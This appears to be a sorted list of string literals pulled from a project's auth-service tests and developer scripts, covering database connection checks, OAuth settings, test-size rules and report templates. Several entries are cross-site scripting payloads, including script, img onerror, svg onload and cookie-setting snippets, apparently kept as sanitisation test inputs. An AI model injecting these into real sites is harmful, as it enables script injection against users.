    "1. **Resource Utilization Analysis**\n           - GPU utilization averaging 67% with peaks at 95%\n           - Memory usage shows gradual increase pattern\n           - CPU bottleneck detected during data preprocessing\n        \n        2. **Cost Optimization Opportunities**\n           - Switch to spot instances for batch workloads (30% savings)\n           - Implement request batching for 40% throughput improvement\n           - Consider model quantization for inference optimization\n        \n        3. **Performance Recommendations**\n           - Enable tensor parallelism for large models\n           - Implement gradient checkpointing to reduce memory\n           - Use mixed precision training for 2x speedup\n        \n        4. **Scaling Considerations**\n           - Current setup can handle 10x load with modifications\n           - Recommend horizontal scaling for API endpoints\n           - Database connection pooling needs adjustment",
    "1. Back up all files first",
    "1. Base URL:",
    "1. Check for missing dependencies: pip install -r requirements.txt",
    "1. Checking Alembic configuration files...",
    "1. Database name mismatch ('postgres' vs expected 'netra_staging')",
    "1. Environment safety checks...",
    "1. Extract setup logic into fixture or helper method",
    "1. Fetching individual PostgreSQL secrets...",
    "1. Fetching staging configuration...",
    "1. Fetching staging database configuration...",
    "1. Fetching staging database secrets...",
    "1. IMMEDIATE FIX: Use 'postgres' database as configured in Secret Manager",
    "1. Missing mocks for external services (ClickHouse, Redis, WebSocket)",
    "1. Mock component function fix",
    "1. Move fixtures to appropriate service-level conftest.py",
    "1. Preparing migration environment...",
    "1. Production environment URLs...",
    "1. Quick real e2e test (with mock services):",
    "1. Review SPEC/no_test_stubs.xml for guidelines",
    "1. Review the changes with: git diff",
    "1. Review the report above",
    "1. Run tests to verify functionality: python unified_test_runner.py",
    "1. Run the authentication tests to verify fixes",
    "1. Set GOOGLE_CLIENT_ID in .env file",
    "1. Split by test categories (unit/integration/e2e)",
    "1. Split by test categories:",
    "1. Test Size Validator - scans for violations",
    "1. Test Size Validator:",
    "1. Test files MUST be ‚â§300 lines (SPEC/testing.xml)",
    "1. Testing URL conversion...",
    "1. Testing URL validation...",
    "1. Testing auth service imports...",
    "1. Testing engine creation...",
    "1. Testing import resolution...",
    "1. Testing session management patterns...",
    "1. VERIFY which database should be used:",
    "1. Validating configuration...",
    "1. `",
    "1.0.0",
    "1.1.1.1,",
    "1.5s",
    "10",
    "12",
    "123",
    "123456",
    "12345678",
    "123456789",
    "1234567890",
    "1234567890123456",
    "127.0.0.1",
    "13/15",
    "15",
    "192.168.1.1",
    "192.168.1.100",
    "1h 1m",
    "1m 30s",
    "2",
    "2. **Extract Shared Utilities** - Move common mocks to test/fixtures directory",
    "2. Building database URL...",
    "2. Building database URLs using DatabaseURLBuilder...",
    "2. Building database URLs...",
    "2. Building migration URLs...",
    "2. Check git status: git status",
    "2. Check that JWT tokens are properly validated",
    "2. Checking DatabaseManager methods...",
    "2. Delete the violating conftest.py files",
    "2. Different access patterns...",
    "2. Full real e2e test (with actual LLM):",
    "2. Large file splitting",
    "2. Look for circular imports in the error messages above",
    "2. Manually refactor files with violations",
    "2. Migration URL safety...",
    "2. Missing auth service tables in the 'postgres' database",
    "2. PROPER FIX: Create 'netra_staging' database for staging environment",
    "2. Replace test stubs with real implementations",
    "2. Run mock-only tests: pytest -m mock_only",
    "2. Set GOOGLE_CLIENT_SECRET in .env file",
    "2. Split by functionality being tested",
    "2. Split by test classes:",
    "2. Split into multiple focused test cases",
    "2. Test Refactoring Helper - suggests splits",
    "2. Test Refactoring Helper:",
    "2. Test functions MUST be ‚â§8 lines (SPEC/testing.xml)",
    "2. Testing Alembic dry run...",
    "2. Testing Cloud SQL detection...",
    "2. Testing SSL connection...",
    "2. Testing TCP detection...",
    "2. Testing URL validation methods...",
    "2. Testing command generation...",
    "2. Testing invalid URLs...",
    "2. Testing migration commands...",
    "2. Tests expecting specific implementation details that have changed",
    "2. UPDATE Secret Manager if needed:",
    "2. Use dry-run mode to preview changes",
    "2.0",
    "20",
    "2025-08-24T00:00:00Z",
    "2d",
    "3",
    "3. **Use Real Components** - Replace mocks with actual component instances",
    "3. Commit changes: git add . && git commit -m 'Standardize L3 test naming'",
    "3. Extract assertion logic into helper methods",
    "3. Extract helper functions:",
    "3. Function size reduction",
    "3. Integration tests running as unit tests",
    "3. Manually refactor instead of using auto-fix",
    "3. Move test helpers to app/tests/ directory",
    "3. Need to run migrations or use correct staging database",
    "3. RUN database migrations on correct database:",
    "3. Run real service tests: ENABLE_REAL_LLM_TESTING=true pytest -m real_services",
    "3. Safety considerations...",
    "3. Set JWT_SECRET_KEY in .env file (must match auth service)",
    "3. Split by functionality, test type, or scenario",
    "3. Split by test class if using class-based tests",
    "3. Test Runner Integration - pre-run validation",
    "3. Test Runner Integration:",
    "3. Testing URL generation...",
    "3. Testing URL normalization for migrations...",
    "3. Testing URL normalization...",
    "3. Testing async connection with asyncpg...",
    "3. Testing auth service URL conversion...",
    "3. Testing full startup integration...",
    "3. UPDATE: Secret Manager to use 'netra_staging' if that's the intended DB",
    "3. Update test imports if necessary",
    "3. Use established patterns like fixtures and helper functions",
    "3. Verify all module files exist and have no syntax errors",
    "3. Verify service-to-service authentication works",
    "3. With specific LLM model:",
    "3.5.2",
    "30",
    "300",
    "30s",
    "34.132.142.103",
    "35.223",
    "3d",
    "4",
    "4. **Mock External APIs Only** - Keep mocking limited to HTTP clients, databases",
    "4. Check that __init__.py files exist in all package directories",
    "4. Compliance Examples - properly sized tests",
    "4. Extract common setup to fixtures or helper functions",
    "4. Mock reduction in integration tests",
    "4. Move helper functions to separate test utilities module",
    "4. Run 'python scripts/remove_test_stubs.py --scan' locally",
    "4. Run tests after each refactoring to ensure correctness",
    "4. Split by feature being tested:",
    "4. Start auth service: python -m auth_service.auth_core.main",
    "4. TEST connection in staging environment:",
    "4. Testing engine creation configuration...",
    "4. Testing environment-specific URL selection...",
    "4. Testing sync connection with psycopg2...",
    "4. Use parameterized tests for multiple scenarios",
    "4. View Examples:",
    "405 response should include Allow header, headers:",
    "405 responses should include Allow header with supported methods",
    "4d",
    "5",
    "5. **Split Large Functions** - Break down oversized test functions",
    "5. Debug information...",
    "5. Start backend service: python scripts/dev_launcher.py",
    "5. Use parameterized tests to reduce duplication",
    "5. VERIFY auth operations work end-to-end:",
    "50ms",
    "5432",
    "6",
    "6. Check OAuth redirect configuration in backend",
    "6379",
    "7",
    "7. Check token generation in auth service",
    "7. Enable dev login: Set ALLOW_DEV_LOGIN=true in .env",
    "8",
    "8000",
    "8080",
    "8081",
    "999999",
    "999999999",
    ":",
    ":\n    \"\"\"Comprehensive test suite for",
    ":\n    \"\"\"Test suite for",
    ":\nExpected:",
    ": '",
    ": <not set>",
    ": Custom runner without ACT comment",
    ": FAILED WITH EXCEPTION",
    ": Implement",
    ": MISSING - No API key",
    ": NOT AVAILABLE",
    ": No tests run",
    ": OK - API key configured (from",
    ": database \"postgres\" does not exist",
    ": expected",
    ": got",
    "://",
    "://***@",
    "::",
    ":memory:",
    "<",
    "<!DOCTYPE html>\n<html>\n<head>\n    <title>Real Service Test Report</title>\n    <style>\n        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }\n        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }\n        h1 { color: #333; border-bottom: 3px solid #007bff; padding-bottom: 10px; }\n        h2 { color: #555; margin-top: 30px; }\n        .metric-card { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 4px solid #007bff; }\n        .success { color: #28a745; font-weight: bold; }\n        .failure { color: #dc3545; font-weight: bold; }\n        .warning { color: #ffc107; }\n        table { width: 100%; border-collapse: collapse; margin: 15px 0; }\n        th { background: #007bff; color: white; padding: 10px; text-align: left; }\n        td { padding: 10px; border-bottom: 1px solid #ddd; }\n        tr:hover { background: #f5f5f5; }\n        .chart { margin: 20px 0; }\n        .progress-bar { width: 100%; height: 30px; background: #e9ecef; border-radius: 5px; overflow: hidden; }\n        .progress-fill { height: 100%; background: linear-gradient(90deg, #28a745, #20c997); display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; }\n    </style>\n    <script src=\"https://cdn.jsdelivr.net/npm/chart.js\"></script>\n</head>\n<body>\n    <div class=\"container\">\n        <h1>Real Service Test Report</h1>",
    "</div></body></html>",
    "<30",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<img src=x onerror=alert('XSS')>",
    "<script>",
    "<script>alert(\"XSS in logs\")</script>",
    "<script>alert('XSS')</script>",
    "<script>alert('xss')</script>",
    "<script>document.cookie='admin=true'</script>",
    "<svg onload=alert('XSS')>",
    "=",
    "===",
    "=== AUTHENTICATION TESTS ===",
    "=== Agent Initialization Tests ===",
    "=== Analyzing Connection Issue ===",
    "=== Analyzing Database Name Configuration ===",
    "=== BASIC FUNCTIONALITY TESTS ===",
    "=== Checking Cloud SQL Proxy Status ===",
    "=== Checking PostgreSQL Availability ===",
    "=== Final Summary ===",
    "=== L3 Test File Standardization ===",
    "=== Mock Analysis Summary ===",
    "=== Next Steps to Resolve Auth Database Issue ===",
    "=== OUTPUT FORMAT TESTS ===",
    "=== Progress:",
    "=== REPOSITORY HANDLING TESTS ===",
    "=== Summary ===",
    "=== Test Results ===",
    "=== Testing Auth Client Environment Detection ===",
    "=== Testing Auth Service Database Connection ===",
    "=== Testing AuthConfig ===",
    "=== Testing AuthConfig Integration ===",
    "=== Testing Backend Service Database Connection ===",
    "=== Testing Cloud SQL Connector Availability ===",
    "=== Testing Connection with AuthConfig URL ===",
    "=== Testing DatabaseURLBuilder ===",
    "=== Testing Direct asyncpg Connection ===",
    "=== Testing Middleware Environment Defaults ===",
    "=== Testing OAuth Config Fallback ===",
    "=== Testing Schema Defaults ===",
    "=== Testing TCP Fallback Connection ===",
    "=== Testing URL Construction ===",
    "=== Testing URL Generation with Actual Credentials ===",
    "=== Top 10 Unjustified Mocks to Fix ===",
    "=== Validating Staging Credentials ===",
    ">",
    "?",
    "? Password seems short (",
    "? Using non-standard user:",
    "?host=/cloudsql/",
    "@",
    "@/utils/connection-status-utils",
    "@abstractmethod",
    "@domain.com",
    "@example.com",
    "@gmail.com",
    "@localhost:",
    "@mock_justified",
    "@patch",
    "@patch\\([\\'\"]([^\\'\"]*)[\\'\"].*?\\)",
    "@pytest.",
    "@pytest.mark.",
    "@pytest.mark.e2e",
    "@pytest.mark.integration",
    "@pytest.mark.mock_only",
    "@pytest.mark.real_clickhouse",
    "@pytest.mark.real_database",
    "@pytest.mark.real_llm",
    "@pytest.mark.real_redis",
    "@pytest.mark.real_services",
    "@pytest.mark.skip",
    "@pytest.mark.skipif(\n    os.environ.get(\"ENABLE_REAL_LLM_TESTING\") != \"true\",\n    reason=\"Real LLM tests disabled. Set ENABLE_REAL_LLM_TESTING=true to run\"\n)",
    "@pytest.mark.unit",
    "@pytest\\.fixture.*?\\ndef\\s+(\\w+)",
    "@skip",
    "@users.noreply.github.com",
    "A",
    "ABC",
    "ACCESS_TOKEN_EXPIRE_MINUTES",
    "ACCOUNT_LOCKED",
    "ACCOUNT_LOCKOUT_DURATION",
    "ACCOUNT_UNLOCKED",
    "ACT",
    "ACT: ${{ env.ACT }}",
    "ACTION REQUIRED",
    "ACTUALLY",
    "ALL DATABASE CONNECTION TESTS PASSED!",
    "ALL TESTS PASSED",
    "ALLOWED conftest.py files (service-level):",
    "ALLOWED_HOSTS",
    "ALLOW_DEV_LOGIN",
    "ALLOW_PROD_TESTS",
    "ALTER TABLE auth_users \n                    ADD CONSTRAINT auth_users_email_unique UNIQUE (email)",
    "ANTHROPIC_API_KEY",
    "API Agents",
    "API Documentation",
    "API Endpoints Issues - Failing Tests\n\nTests that replicate missing API endpoints causing 404/405 errors found in staging.\nThese tests are designed to FAIL to demonstrate current problems.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: API reliability and complete endpoint coverage\n- Value Impact: Ensures all expected authentication endpoints are available\n- Strategic Impact: Prevents API failures affecting frontend integration\n\nKey Issues to Test:\n1. Missing /auth/google endpoint causing 404 errors\n2. Missing /oauth/config endpoint causing 404 errors  \n3. HEAD method not supported on /auth/login causing 405 errors\n4. Similar issues for other OAuth providers",
    "API Threads List",
    "API URL not found",
    "API Workspaces",
    "API docs are accessible",
    "API docs check failed:",
    "API docs returned status",
    "API endpoint tests",
    "API endpoints test failed",
    "API endpoints test failed:",
    "API endpoints test passed",
    "API key configured",
    "API port",
    "API_BASE_URL",
    "AST analysis failed for",
    "AUTH DATABASE SESSION TEST SUMMARY",
    "AUTH SERVICE DATABASE SESSION MANAGEMENT TESTING",
    "AUTH_BASE_URL",
    "AUTH_FAST_TEST_MODE",
    "AUTH_SERVICE_PORT",
    "AUTH_SERVICE_URL",
    "AUTH_SERVICE_URL:",
    "AUTH_USE_FILE_DB",
    "AUTOMATED SPLITTING SUGGESTIONS (",
    "AUTOMATION:\n- Add to CI/CD pipeline as mandatory checks\n- Create deployment validation script\n- Automated rollback if OAuth validation fails\n- Staging OAuth tests must pass before production\n\nVALIDATION COMMANDS:\npython scripts/validate_oauth_configuration.py --env staging\npython unified_test_runner.py --env staging -k \"oauth\"  \npython scripts/test_oauth_end_to_end.py --env staging",
    "AVAILABLE TEST CATEGORIES",
    "AVAILABLE TEST LEVELS",
    "AWS-Application-Load-Balancer-Health-Check",
    "Accept",
    "Access token duration:",
    "Access-Control-Allow-Headers",
    "Access-Control-Allow-Methods",
    "Access-Control-Allow-Origin",
    "Access-Control-Request-Headers",
    "Access-Control-Request-Method",
    "Action Required:",
    "Action:",
    "Active connections:",
    "Actual file generation not yet implemented",
    "Actual fixes require force_unsafe=True. Switching to dry-run mode.",
    "Actual redirect_uri:",
    "Actual:",
    "Actually valid:",
    "Add",
    "Add assertions to",
    "Add caching layer",
    "Add circuit breakers",
    "Add more end-to-end tests (current:",
    "Add pytest markers to test files",
    "Add this URL to Google OAuth Console authorized redirect URIs",
    "Added",
    "Added missing typing imports",
    "Added mock imports",
    "Adding pytest markers to test files...",
    "Additional arguments to pass to Jest",
    "Address critical bottlenecks immediately",
    "After examining the performance metrics, here are my recommendations:",
    "Agent-specific tests",
    "Agent-specific tests with real LLMs",
    "Aggregating coverage...",
    "Alembic Configuration",
    "Alembic migration correctly failed:",
    "Alembic upgrade failed: database \"postgres\" does not exist",
    "Alert if 'No token received' errors increase",
    "Alert if OAuth callback endpoints return 404",
    "Alert if OAuth callback failures spike",
    "Alert if OAuth provider response time > 5s",
    "Alert if OAuth provider returns 4xx/5xx errors",
    "Alert if OAuth redirect URI uses frontend URL",
    "Alert if OAuth state parameter validation fails",
    "Alert if OAuth success rate drops below 90%",
    "Alert if redirect_uri_mismatch errors detected",
    "Align Test Imports and Configuration Script\nFixes all test-related import issues and configuration misalignments.",
    "All OAuth vars missing",
    "All auth service instances failed to shut down gracefully - cascade failure",
    "All configured",
    "All critical imports successful!",
    "All redirect URIs are authorized in Google Console",
    "All results should be boolean",
    "All state parameters should be unique",
    "All syntax errors fixed!",
    "All tests comply with real test requirements!",
    "All tests comply with requirements!",
    "All tests passed! The script is working correctly.",
    "All tests validated successfully",
    "All tokens should be checked",
    "All unique hashes should verify correctly",
    "Allow",
    "Allow header should list supported methods, got:",
    "Allow production tests to run (requires explicit flag)",
    "Allowed locations:",
    "Already in correct order",
    "Analysis Complete:",
    "Analysis complete. 3 optimization opportunities identified.",
    "Analysis complete. Suggested creating",
    "Analysis failed:",
    "Analysis for",
    "Analyze current test coverage",
    "Analyze file for splitting",
    "Analyze test mocks in the codebase to identify unjustified mocks.\nBased on testing.xml spectrum levels (L0-L5).",
    "Analyze test reports in time range.",
    "Analyze test size violations and generate improvement suggestions",
    "Analyzing",
    "Analyzing and suggesting fixes for",
    "Analyzing large test file:",
    "Analyzing test pairs...",
    "Analyzing:",
    "Anti-regression hook to prevent conftest.py violations.\nEnsures conftest.py files only exist at service-level directories.",
    "App title should contain 'Auth Service', got:",
    "Applied",
    "Applying known fixes...",
    "Are you ABSOLUTELY SURE you want to proceed? Type 'YES I UNDERSTAND THE RISKS':",
    "Argon2 hash should have at least 5 parts, got",
    "Assert Redis key was deleted",
    "Assert Redis key was set",
    "Assert session does not exist in database",
    "Assert session exists in database",
    "Assert session exists in database with expected values",
    "Assert user does not exist in database",
    "Assert user exists in database with expected data",
    "Assert user exists in database with expected values",
    "Assertion Helpers for Auth Service Tests\nCustom assertion functions for common auth testing scenarios.\nProvides clear and reusable assertions with detailed error messages.",
    "AssertionError",
    "AssertionHelpers",
    "Assess quality of existing tests",
    "Async URL has SSL:",
    "Async URL:",
    "Async auth operations failed:",
    "Async setup - override in subclasses",
    "Async teardown - override in subclasses",
    "AsyncMock()",
    "AsyncMock\\(",
    "AsyncMock\\(\\)",
    "AsyncMock\\(spec=LLMManager\\)",
    "AsyncTestBase",
    "At least one concurrent initialization should succeed:",
    "At least one initialization should succeed, got results:",
    "Attempt to automatically fix violations",
    "Attempting TCP connection with params:",
    "Attempting connection with params:",
    "Attempting to connect to",
    "Attempting to fix:",
    "AttributeError",
    "AttributeError: '(\\w+)' object has no attribute '(\\w+)'",
    "AttributeError: <module '([\\w\\.]+)'.*> does not have the attribute '(\\w+)'",
    "Audit Log Test Data Factory\nCreates audit log entries for testing authentication events and security monitoring.\nSupports various event types with proper metadata and tracking.",
    "AuditLogFactory",
    "Auth Database Engine Creation",
    "Auth Database Manager Import",
    "Auth Database Session Lifecycle",
    "Auth Database Staging Integration",
    "Auth Database URL Conversion",
    "Auth Database URL Validation",
    "Auth Endpoint:",
    "Auth Health",
    "Auth Service",
    "Auth Service 500 error handling timeout - no resilience mechanism",
    "Auth Service Actual Staging Credentials Test",
    "Auth Service Base Test Classes\nCommon test functionality and base classes for auth service testing",
    "Auth Service Database Connection Test",
    "Auth Service Down Critical Scenarios - Iteration 2 Audit Findings\n\nThis test file specifically focuses on scenarios where the Auth Service is completely\ndown, unreachable, or failing, which is a major contributor to the authentication\nsystem failure identified in Iteration 2:\n\n**CRITICAL AUTH SERVICE DOWN SCENARIOS:**\n1. Auth Service completely unresponsive (no HTTP response)\n2. Auth Service returning 500 Internal Server Error\n3. Auth Service database connectivity lost\n4. Auth Service container/process crashed\n5. Auth Service overwhelmed with requests (503 Service Unavailable)\n6. Auth Service network partitioned from other services\n7. Auth Service SSL certificate expired\n8. Auth Service OAuth provider connectivity lost\n9. Auth Service Redis/cache layer down\n10. Auth Service graceful shutdown not working\n\n**EXPECTED TO FAIL**: These tests demonstrate what happens when Auth Service fails\nand expose the lack of fallback mechanisms causing system-wide authentication breakdown\n\nSystem Impact When Auth Service Down:\n- Frontend cannot authenticate users (100% authentication failure)\n- Backend cannot validate tokens (all requests rejected with 403)\n- No fallback authentication mechanisms\n- No cached authentication decisions\n- No graceful degradation\n- 6.2+ second timeouts waiting for unresponsive auth service\n\nRoot Causes (Auth Service Failures):\n- Single point of failure with no redundancy\n- No health checks or automatic recovery\n- No caching layer for authentication decisions  \n- No fallback to alternative authentication methods\n- Dependencies on external services without circuit breakers",
    "Auth Service Health",
    "Auth Service Integration Reliability Test.\n\nThis test validates that auth service integration is reliable and handles edge cases properly.",
    "Auth Service Integration Tests",
    "Auth Service Staging SSL Failure Tests\n\nSpecific failing tests for auth service SSL parameter issues in staging.\nThese tests reproduce the exact SSL parameter mismatches that cause\n\"unrecognized configuration parameter\" errors.\n\nQA Agent: Auth Service SSL Root Cause Analysis  \nCreated: 2025-08-24\nPurpose: Validate auth-specific SSL parameter handling failures",
    "Auth Service Startup Integration Test\n\nTests the complete auth service startup process including:\n- Module import resolution\n- Database connectivity\n- Redis connectivity  \n- Configuration loading\n- Health endpoint functionality\n- Windows compatibility\n\nThis test verifies that the fixes for the dev launcher startup issues work correctly.",
    "Auth Service Test Configuration Module\nTest configuration and environment management for auth service tests",
    "Auth Service Test Database Module\nDatabase utilities for test isolation and management",
    "Auth Service Test Factories\nTest data factories for creating consistent test data.",
    "Auth Service Test Utilities\nHelper functions and utilities for auth service testing",
    "Auth Service URL Construction Test",
    "Auth Service became completely unresponsive due to database connectivity loss",
    "Auth Service becomes unresponsive when Redis cache layer is down",
    "Auth Service crash recovery mechanism not implemented:",
    "Auth Service crashes when Redis cache layer is down",
    "Auth Service hanging due to database connectivity loss",
    "Auth Service should automatically restart after crash",
    "Auth Service should be new process after restart",
    "Auth Service should remain responsive with degraded database, got",
    "Auth Service should work without Redis, got",
    "Auth Service: [green]‚úì Healthy[/green]",
    "Auth Service: [red]‚úó Not reachable -",
    "Auth Service: [red]‚úó Unhealthy (",
    "Auth Tests - Split from test_oauth_flows.py",
    "Auth URL: [cyan]",
    "Auth async URL:",
    "Auth database initialization failed:",
    "Auth database initialized successfully",
    "Auth decorators not yet implemented",
    "Auth instance",
    "Auth models import failed:",
    "Auth must start before backend",
    "Auth routes import failed:",
    "Auth service URL",
    "Auth service URL missing 'auth.' subdomain:",
    "Auth service URL not found",
    "Auth service URL:",
    "Auth service and frontend URLs are identical - configuration error!\nAuth service:",
    "Auth service can reach external OAuth providers",
    "Auth service config import failed:",
    "Auth service exited early. Exit code:",
    "Auth service failed to start",
    "Auth service failure took",
    "Auth service health check failed:",
    "Auth service import failed:",
    "Auth service main not available",
    "Auth service not available",
    "Auth service process cleaned up",
    "Auth service request timeout after",
    "Auth service responded when it should be down",
    "Auth service skips .env loading",
    "Auth service specific test configuration.\nUses consolidated test framework infrastructure with auth-specific customizations.",
    "Auth service started successfully",
    "Auth service startup timed out",
    "Auth should be able to start, missing:",
    "Auth should be in degraded services",
    "Auth tables should exist after initialization",
    "AuthConfig Integration",
    "AuthConfig URL:",
    "AuthConfig defaults to problematic 'netra_dev' database:",
    "AuthConfig generated URL:",
    "AuthConfig integration test failed:",
    "AuthConfig should normalize DATABASE_URL",
    "AuthDatabaseManager imported successfully",
    "AuthDatabaseManager missing get_auth_database_url_async static method",
    "AuthDatabaseManager must have get_auth_database_url_async method",
    "AuthDatabaseManager must have is_cloud_sql_environment method",
    "AuthDatabaseManager must have is_test_environment method",
    "AuthDatabaseManager must have validate_auth_url method",
    "AuthDatabaseManager should detect problematic staging configuration",
    "AuthDatabaseManager should validate staging readiness with correct configuration",
    "AuthDatabaseManager validation allows problematic 'postgres' database. Should recommend using application-specific database name like 'netra_auth'.",
    "AuthSecretLoader correctly detected missing",
    "AuthSecretLoader.",
    "AuthSessionFactory",
    "AuthTestBase",
    "AuthTestClient",
    "AuthTestEnvironment",
    "AuthTestMixin",
    "AuthTestUtils",
    "AuthUser creation correctly failed due to database issue:",
    "AuthUserFactory",
    "Authentication Token Generation Tests - Business Impact\n\nSecurity Foundation: Core Authentication Infrastructure\n- Ensures secure JWT token generation for all authentication flows\n- Validates token structure and claims for security compliance  \n- Foundation for all authentication and authorization in the platform\n\nTechnical Excellence:\n- JWT token generation: access, refresh, and service tokens with proper structure\n- Token claims validation: user ID, email, permissions, and metadata\n- Token timing: consistent generation performance and unique token creation\n- Token type consistency: standardized structure across all token types\n- Expiry configuration: proper token lifetime management for security\n\nPlatform Security:\n- Platform: Secure token generation foundation for all authentication\n- Security: JWT structure compliance for SOC2/GDPR requirements\n- Microservices: Service token generation for inter-service communication\n- Performance: Fast token generation (<1s) for responsive authentication\n- Consistency: Standardized token structure across all authentication flows",
    "Authentication Token Generation Tests - JWT token creation and structure validation\n\nTests JWT token generation with various claims, token types, and security configurations.\nCritical for ensuring secure token creation in the auth service.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Foundation | Impact: Core Security\n- Ensures secure JWT token generation for all authentication flows\n- Validates token structure and claims for security compliance\n- Foundation for all authentication and authorization in the platform\n\nTest Coverage:\n- Basic access token generation\n- Access tokens with permission claims\n- Refresh token generation with proper structure\n- Service token generation for microservice communication\n- Token structure validation and security compliance",
    "Authentication Token Security Tests - Business Impact\n\nSecurity Foundation: Critical Security Protection ($100K+ MRR)\n- Prevents security breaches that could cost $100K+ in damages and reputation\n- Ensures authentication security compliance for enterprise contracts\n- Validates comprehensive security policies and attack prevention\n\nTechnical Excellence:\n- Signature verification: tampered token detection and integrity protection\n- Claims extraction: secure claims validation and privilege boundaries\n- Attack prevention: 'none' algorithm, timing attacks, and signature tampering\n- Revocation support: user-based and time-based revocation mechanisms\n- Security boundaries: token type enforcement and privilege separation\n- Timing resistance: consistent validation times to prevent timing attacks\n\nEnterprise Security:\n- Platform: Comprehensive security foundation for enterprise authentication\n- Compliance: Security validation for SOC2/GDPR enterprise requirements\n- Attack Prevention: Protection against common JWT security vulnerabilities\n- Integrity: Signature and claims validation maintains authentication trust\n- Boundaries: Security separation between token types and privileges",
    "Authentication Token Security Tests - Security validation and attack prevention\n\nTests JWT token security features including signature verification, tampering detection,\nrevocation mechanisms, and comprehensive security boundary enforcement.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Security Compliance | Impact: Critical Security\n- Prevents security breaches that could cost $100K+ in damages and reputation\n- Ensures authentication security compliance for enterprise contracts\n- Validates comprehensive security policies and attack prevention\n\nTest Coverage:\n- JWT signature verification and tampering detection\n- Token revocation mechanisms and security lifecycle\n- Claims extraction and security validation\n- Attack prevention and security boundary enforcement\n- Security compliance validation for enterprise requirements",
    "Authentication Token Validation Tests - Business Impact\n\nSecurity Foundation: Authentication Integrity Protection\n- Ensures secure JWT token validation across all authentication flows\n- Validates security boundaries and prevents unauthorized access\n- Critical for maintaining authentication integrity in production\n\nTechnical Excellence:\n- Token validation: comprehensive validation for access, refresh, and service tokens\n- Security boundaries: proper token type enforcement and access control\n- Signature verification: tampered token detection and integrity protection\n- Expiry validation: time-based security and token lifecycle management\n- Performance validation: fast token validation (<10ms average) for responsive auth\n- Concurrent validation: thread-safe validation for production scalability\n\nPlatform Security:\n- Platform: Secure token validation foundation for all authentication flows\n- Security: Comprehensive validation prevents security vulnerabilities and attacks\n- Performance: Fast validation ensures responsive authentication experience\n- Boundaries: Token type enforcement prevents privilege escalation\n- Integrity: Signature and timing validation maintains authentication trust",
    "Authentication Token Validation Tests - JWT token validation and security verification\n\nTests JWT token validation scenarios including signature verification, expiry checking,\ntoken type validation, and security boundary enforcement in the auth service.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Security | Impact: Core Security\n- Ensures secure JWT token validation across all authentication flows\n- Validates security boundaries and prevents unauthorized access\n- Critical for maintaining authentication integrity in production\n\nTest Coverage:\n- Valid token validation across different token types\n- Invalid token type rejection and security boundaries\n- Token expiry validation and time-based security\n- Signature verification and tampering detection\n- Token structure validation and malformed token handling",
    "Authentication failed during background operation",
    "Authentication service temporarily unavailable",
    "Authentication service tests",
    "Authentication test failed:",
    "Authentication test token fixes completed!",
    "Authentication:",
    "Authorization",
    "Authorization code reuse attack detected",
    "Auto-fix functionality not implemented yet.",
    "Auto-fix linting issues",
    "Auto-fix operations can break your tests!",
    "Auto-generated by Autonomous Test Reviewer with Ultra-Thinking\nGenerated:",
    "Auto-split window size in minutes (default: 15)",
    "Auto-splitting is experimental - manual review required",
    "Automated Test Size Violation Fixer\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity - Enable test runner to function, unblock development pipeline\n- Value Impact: Restores test execution capability, prevents regression accumulation\n- Strategic Impact: $50K+ monthly dev velocity protection through working test infrastructure\n\nThis script automatically fixes test size violations by:\n1. Splitting oversized test files (>300 lines) into focused modules\n2. Extracting common fixtures and utilities\n3. Breaking large test functions (>8 lines) into focused tests\n4. Preserving all test functionality while improving maintainability",
    "Automated test fix loop script.\n\nThis script runs test suite iterations and fixes issues automatically.",
    "Automated test thread",
    "Automatic function refactoring is not supported",
    "Automatically fix identified issues",
    "Automatically fix test size violations",
    "Autonomous Test Review System - Entry Point\nWrapper script for the autonomous test review system",
    "Autonomous Test Review System - Main Reviewer\nMain autonomous test reviewer class for orchestrating analysis and improvements",
    "Autonomous Test Review System - Test Generator\nIntelligent test generation and modernization capabilities",
    "Available CLI tools:",
    "Available URLs:",
    "Available categories:",
    "Average Business Value Score:",
    "Average Duration:",
    "Average Success Rate:",
    "Average validation time:",
    "B",
    "BACKEND_PORT",
    "BACKEND_URL",
    "BASE_SERVICE",
    "BASE_URL",
    "BATCH PROCESSING COMPLETE",
    "BATCH TEST FIXER",
    "BUSINESS VALUE TEST COVERAGE SUMMARY",
    "BVJ:",
    "BVJ: JWT Validation Tests\n\nSegment: Enterprise & Growth (Critical security infrastructure)\nBusiness Goal: Zero authentication vulnerabilities, secure token validation\nValue Impact:\n- Prevents JWT-based security attacks (signature tampering, algorithm confusion)\n- Enables secure token-based authentication for enterprise features\n- Supports proper token lifecycle management and revocation\n- Protects against expired token usage and claim validation bypasses\n\nStrategic/Revenue Impact: Authentication security foundation for enterprise sales\nCritical for SOC2 compliance and security audit requirements",
    "Backed up",
    "Backend API Health",
    "Backend Auth Required",
    "Backend Health",
    "Backend Integration",
    "Backend Service",
    "Backend Service: [green]‚úì Healthy[/green]",
    "Backend Service: [red]‚úó Not reachable -",
    "Backend Service: [red]‚úó Unhealthy (",
    "Backend Startup Tests",
    "Backend Tests:",
    "Backend URL: [cyan]",
    "Backend alone should not trigger production, got",
    "Backend health check failed:",
    "Backend integration test failed:",
    "Backend is healthy",
    "Backend must start before frontend",
    "Backend returned status",
    "Backend service URL",
    "Backend service failed to start",
    "Backend service tests",
    "Backend should be in registry",
    "Backend should have started",
    "Backend should not start before auth is ready",
    "Backend skips .env loading",
    "Backend unhealthy:",
    "Background task",
    "Background tasks prevented clean shutdown, took",
    "Backups stored in:",
    "Bad file descriptor",
    "Base Test Classes\nCommon functionality for auth service tests with proper setup and teardown.\nFollows 450-line limit with focused test infrastructure.",
    "Base URL",
    "Base URL validation:",
    "Base URL:",
    "Based on the analysis of your AI workload, I've identified several optimization opportunities.",
